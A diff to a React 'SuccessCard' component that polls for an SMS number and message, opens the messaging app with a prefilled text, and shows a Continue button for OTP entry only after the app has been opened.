@@ -1,10 +1,10 @@
 "use client";
 
-import { useEffect, useState } from "react";
-import { CheckCircle2, MessageSquare, Loader2 } from "lucide-react";
+import { useEffect, useState, useCallback } from "react";
+import { CheckCircle2, MessageSquare, Loader2, ArrowRight } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
-import { getSmsConfig } from "@/lib/actions/sms";
+import { getSmsConfig, markSmsOpened } from "@/lib/actions/sms";
 
 interface SuccessCardProps {
   submissionId: string;
@@ -15,32 +15,53 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
   const [isMobile, setIsMobile] = useState(false);
   const [smsNumber, setSmsNumber] = useState("32022");
   const [smsMessage, setSmsMessage] = useState("");
+  const [smsOpened, setSmsOpened] = useState(false);
   const [loading, setLoading] = useState(true);
+
+  const fetchConfig = useCallback(async () => {
+    try {
+      const result = await getSmsConfig(submissionId);
+      if (!result.error) {
+        setSmsNumber(result.sms_number);
+        if (result.message) setSmsMessage(result.message);
+        if (result.sms_opened) setSmsOpened(true);
+      }
+    } catch {
+      // use defaults
+    }
+    setLoading(false);
+  }, [submissionId]);
 
   useEffect(() => {
     setIsMobile(/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
     fetchConfig();
     const interval = setInterval(fetchConfig, 5000);
     return () => clearInterval(interval);
-  }, [submissionId]);
+  }, [fetchConfig]);
 
-  async function fetchConfig() {
-    try {
-      const result = await getSmsConfig(submissionId);
-      if (!result.error) {
-        setSmsNumber(result.sms_number);
-        if (result.message) setSmsMessage(result.message);
-      }
-    } catch {
-      // use defaults
+  useEffect(() => {
+    function handleVisibility() {
+      if (document.visibilityState === "visible") fetchConfig();
     }
-    setLoading(false);
-  }
+    function handleFocus() {
+      fetchConfig();
+    }
+    document.addEventListener("visibilitychange", handleVisibility);
+    window.addEventListener("focus", handleFocus);
+    return () => {
+      document.removeEventListener("visibilitychange", handleVisibility);
+      window.removeEventListener("focus", handleFocus);
+    };
+  }, [fetchConfig]);
 
   async function openSmsApp() {
     const result = await getSmsConfig(submissionId);
     const number = !result.error ? result.sms_number : smsNumber;
     const message = !result.error ? result.message : smsMessage;
+
+    await markSmsOpened(submissionId);
+    setSmsOpened(true);
+
     const uri = message
       ? `sms:${number}?body=${encodeURIComponent(message)}`
       : `sms:${number}`;
@@ -61,7 +82,7 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
           {" "}and ask for OTP. Then click Continue to enter the OTP.
         </p>
         <div className="space-y-3 pt-2">
-          {isMobile && (
+          {!smsOpened && isMobile && (
             <Button
               onClick={openSmsApp}
               variant="outline"
@@ -76,9 +97,11 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
               Open Messaging App
             </Button>
           )}
-          <Button onClick={onContinue} variant="default" className="w-full h-12 text-base">
-            Continue
-          </Button>
+          {smsOpened && (
+            <Button onClick={onContinue} variant="default" className="w-full h-12 text-base gap-2">
+              Continue <ArrowRight className="h-5 w-5" />
+            </Button>
+          )}
         </div>
       </CardContent>
     </Card>
